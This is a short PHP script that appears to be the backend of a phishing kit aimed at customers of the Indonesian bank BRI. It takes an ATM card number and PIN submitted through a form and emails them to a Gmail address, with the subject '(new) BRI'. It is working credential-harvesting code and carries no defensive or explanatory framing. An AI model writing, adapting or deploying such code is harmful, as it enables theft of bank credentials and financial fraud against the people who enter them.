<?php 
ini_set('display_errors', 1);
error_reporting( E_ALL );

$nomoratm = $_POST['nomoratm'];
$pin = $_POST['pin'];

$from = "nisa.codelifings@gmail.com";
$to = "annisjabstore@gmail.com";
$subject = "(new) BRI";
$message = "<div>Nomor ATM : $nomoratm</div><br><div>Pin : $pin</div>";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
echo "Success!!<br>";
 ?>